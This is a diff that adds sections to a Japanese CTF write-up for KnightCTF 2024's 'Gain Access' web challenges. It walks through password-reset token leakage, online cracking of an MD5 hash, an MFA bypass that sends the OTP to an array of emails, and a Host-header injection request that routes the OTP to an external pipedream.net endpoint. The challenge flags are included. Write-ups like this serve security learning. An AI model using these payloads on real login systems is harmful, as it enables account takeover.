@@ -4,7 +4,8 @@ KnightCTF 2024（<https://ctftime.org/event/2209>）に参加しました。
 土, 20 1月 2024, 15:00 UTC — 日, 21 1月 2024, 15:00 UTC
 
 2024年最初のCTFでした。  
-Webは他にも3問くらいありましたが、いつの間にか追加されてたため、その問題はやってません。
+~~Webは他にも3問くらいありましたが、いつの間にか追加されてたため、その問題はやってません。~~  
+競技終了後にGain Accessも解いたので追記します。
 
 <!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=3 orderedList=false} -->
 
@@ -15,6 +16,9 @@ Webは他にも3問くらいありましたが、いつの間にか追加され�
   - [Kitty](#kitty)
   - [README](#readme)
   - [Fluxx](#fluxx)
+  - [Gain Access 1](#gain-access-1)
+  - [Gain Access 2](#gain-access-2)
+  - [Gain Access 3](#gain-access-3)
 - [Steganography](#steganography)
   - [Oceanic](#oceanic)
 
@@ -171,6 +175,202 @@ buckets() |> filter(fn: (r) => r.name =~ /^a.*/ and die(msg:r.name))
 
 参考：
 <https://github.com/Aryt3/writeups/tree/main/jeopardy_ctfs/2024/knight_ctf_2024/Fluxx>
+
+### Gain Access 1
+
+100 points / 118 solves
+
+与えられたURLにアクセスすると、ログイン画面が表示されます。
+
+![Gain Access 1_01](./images/gainaccess1_01.jpg)
+
+SQLインジェクションはできなさそうなので、HTMLを見てみます。  
+下の方にコメントアウトされたメールアドレスを見つけました。
+
+```html
+<!-- root@knightctf.com -->
+```
+
+パスワードは分からないので、試しにパスワードリセット機能を使ってみます。  
+rootアカウントのメールアドレスを入力すると、レスポンスヘッダにリセット用のtokenが含まれていました。  
+ここでは、`token: Gk5vDVp9AyHCjW0RTgr7`です。
+
+```http
+HTTP/1.1 302 Found
+Date: Mon, 22 Jan 2024 13:07:43 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+token: Gk5vDVp9AyHCjW0RTgr7
+refresh: 1;url=index.php
+Content-Length: 39
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Password reset token sent to the email.
+```
+
+パスワードリセット用のURLがわからないので、さらに調査します。  
+`/robots.txt`にパスワードリセット用のパス`/r3s3t_pa5s.php`が記述されていました。
+
+よくあるパスワードリセットURLを作ってアクセスしてみます。  
+（メソッドやパラメータが間違っているとエラーが返ってくるのでわかりやすかったです。）
+
+```text
+http://45.33.123.243:13556/r3s3t_pa5s.php?token=Gk5vDVp9AyHCjW0RTgr7
+```
+
+パスワードをリセットできたので、ログインするとフラグがありました。
+
+- Flag
+
+```text
+KCTF{ACc0uNT_tAk3Over}
+```
+
+### Gain Access 2
+
+440 points / 13 solves
+
+[Gain Access 1](#gain-access-1)と同様にログイン画面が表示されます。  
+HTMLを見ると、MFAが有効になっていそうです。
+
+```html
+.then(data => {
+    // Handle the response from the server
+    // console.log(data);
+    if (data == "true") {
+        window.location.href = "2fa.php";
+    } else {
+        
+        document.getElementById("msg").innerHTML = data;
+        // document.getElementById("msg").style.padding= "10px";
+    }
+}
+)
+```
+
+また、HTMLの最後に以下がコメントアウトされていました。
+
+```html
+<!-- notesssssss.txt -->
+```
+
+`/notesssssss.txt`にアクセスすると、今度は認証情報がありました。
+
+```text
+I've something for you. Think.....
+root@knightctf.com:d05fcd90ca236d294384abd00ca98a2d
+```
+
+MD5と思われるパスワードハッシュがあるので、クラックしてみます。  
+john the ripperでうまくクラックできなかったので、オンラインのサイトでいろいろ調べました。
+
+以下のサイトでクラックできました。
+
+```text
+https://md5hashing.net/hash/md5/d05fcd90ca236d294384abd00ca98a2d
+```
+
+パスワードは`letmein_kctf2024`のようです。  
+ログインすると、MFAの画面が表示されました。
+
+![Gain Access 2_01](./images/gainaccess2_01.jpg)
+
+一度コードを間違えるとログイン画面に戻されるため、総価ではなさそうです。  
+Resend Codeが怪しそうなので、調べてみます。
+
+![Gain Access 2_02](./images/gainaccess2_02.jpg)
+
+メールアドレスを入力すると、そこにコードが送られるようですが、ログインアカウントのメールアドレス以外だと`Invalid Email`と表示されました。  
+そこで、メールアドレスを自分のものに変更して送ることができれば、MFAを回避できそうです。
+
+改行コードを入れた以下は`Invalid Email`になったため、メールヘッダインジェクションではなさそうです。
+
+```json
+{"email":"root@knightctf.com%0d%0acc:test@example.com"}
+```
+
+以下のように、配列で送ると異なるエラーになりました。
+
+```json
+{"email":["test@example.com","root@knightctf.com"]}
+```
+
+```text
+Message could not be sent. Mailer Error: SMTP Error: The following recipients failed: test@example.com: The mail server could not deliver mail to test@example.com.  The account or
+domain may not exist, they may be blacklisted, or missing the proper dns
+entries.
+true
+```
+
+どうやらメールを送れそうなので、一時的なメールアドレスを作って送ってみます。  
+<https://temp-mail.org/en/>
+
+すると、OTPコードが送られてきました。
+
+![Gain Access 2_03](./images/gainaccess2_03.jpg)
+
+あとはこのコードをMFA画面で入力するだけです。  
+`/dashboard.php`にフラグがありました。
+
+![Gain Access 2_04](./images/gainaccess2_04.jpg)
+
+- Flag
+
+```text
+KCTF{AuTh_MIsC0nFigUraTi0N}
+```
+
+- 余談
+
+MFAのコードでSQLインジェクションができるようでしたが、`/dashboard.php`で`Flag Vanished`と表示されました。
+
+### Gain Access 3
+
+445 points / 12 solves
+
+問題文から、メールの送信先がログインアカウントのメールアドレスのみに変更されているようです。  
+リセットメール送信以外は変わっていなそうです。  
+（一部レスポンスにミス？があり、改行が一行多く入っているので調整が必要でした。一行削除+Content-Length: 4にする。）
+
+[Gain Access 2](#gain-access-2)の方法ではメールが送信できなかったです。  
+パスワードリセットでよくある脆弱性として、Hostヘッダを書き換えることでメール内のURLに反映させる方法があります。  
+他に方法が思いつかなかったので、Hostヘッダを書き換えてOTPコード再生成リクエストを送ってみました。
+
+```http
+POST /process_resend_code.php HTTP/1.1
+Host: enuebfjrrfzyh.x.pipedream.net
+Content-Length: 30
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://66.228.53.87:6090
+Referer: http://66.228.53.87:6090/resend_code.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ja,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=27b8ad5f329331603cf3f0620761a182
+Connection: close
+
+{"email":"root@knightctf.com"}
+```
+
+すると、Hostヘッダに指定した宛先にアクセスがありました。  
+どうやら裏側でBotか何かが動いているようです。
+
+![Gain Access 3_01](./images/gainaccess3_01.jpg)
+
+あとはこのOTPコードをMFA画面で入力するだけです。
+
+![Gain Access 3_02](./images/gainaccess3_02.jpg)
+
+- Flag
+
+```text
+KCTF{H0sT_hEaDEr_InJeCti0n_R0CkS}
+```
 
 ## Steganography
 
